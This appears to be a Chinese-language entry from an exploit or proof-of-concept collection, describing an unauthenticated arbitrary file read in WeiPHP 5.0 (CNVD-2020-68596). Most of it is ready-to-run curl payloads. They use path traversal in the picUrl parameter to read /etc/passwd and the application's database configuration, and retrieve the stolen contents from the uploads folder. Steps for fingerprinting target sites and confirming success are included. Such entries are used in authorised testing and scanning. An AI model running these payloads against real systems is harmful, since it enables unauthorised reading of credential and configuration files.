---
id: WEIPHP-FILE-READ
title: WeiPHP 5.0 前台任意文件读取漏洞 (CNVD-2020-68596)
product: weiphp
vendor: WeiPHP
version_affected: "<= 5.0"
severity: HIGH
tags: [file_read, 无需认证, 国产]
fingerprint: ["WeiPHP", "weiphp"]
---

## 漏洞描述

WeiPHP 5.0 及以前版本的 `_download_imgage` 方法存在前台任意文件读取漏洞。`picUrl` 参数的值被直接传入 `wp_file_get_contents()` 读取文件内容并保存为 jpg 文件到 uploads 目录，攻击者可读取服务器上的任意文件（包括数据库配置等敏感文件）。

## 影响版本

- WeiPHP <= 5.0

## 前置条件

- 无需认证

## 利用步骤

1. 向 `_download_imgage` 接口传入目标文件路径
2. 系统将文件内容保存为 jpg 到 uploads 目录
3. 访问保存的 jpg 文件获取内容

## Payload

### 读取数据库配置

```bash
# 触发文件读取
curl -s "http://target/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=/../../../application/database.php"

# 访问保存的文件（从上传目录获取）
curl -s "http://target/public/uploads/picture/$(date +%Y-%m-%d)/" | grep ".jpg"
```

### 读取 /etc/passwd

```bash
curl -s "http://target/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=/../../../../../../../etc/passwd"
```

## 验证方法

这个漏洞本身无回显，文件被存成 jpg 落在 uploads 目录，所以判据分两步：先触发读取，再去 uploads 里读回该文件，找系统文件特征。

```bash
# 1. 触发读取 /etc/passwd（这里用系统文件，特征稳定好判定）
curl -s "http://target/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=/../../../../../../../etc/passwd"

# 2. 列出本次生成的 jpg（文件名取自响应或按日期目录）
curl -s "http://target/public/uploads/picture/$(date +%Y-%m-%d)/" | grep -o '"[^"]*\.jpg"'

# 3. 读回该 jpg，找 /etc/passwd 的内容特征
curl -s "http://target/public/uploads/picture/$(date +%Y-%m-%d)/<文件名>.jpg" | grep -o 'root:x:0:0'
```

判据：回读到的 jpg 内容里出现 `root:x:0:0:root:/root:/bin/bash`。若要读产品配置，判据同样落在文件内容上——`database.php` 回读后应出现 `'hostname'`、`'database'`、`'username'`、`'password'` 这类配置键名与值，而不是「接口返回 200」。

反例：触发接口返回 200，但 uploads 目录里没有本次新增的 jpg，或该 jpg 里没有 `/etc/passwd` 的内容 —— 只是路由存在、请求被受理，文件读取不成立。

## 指纹确认

```bash
curl -s "http://target/" | grep -i "WeiPHP\|weiphp"
```

## 参考链接

- https://www.cnvd.org.cn/flaw/show/CNVD-2020-68596
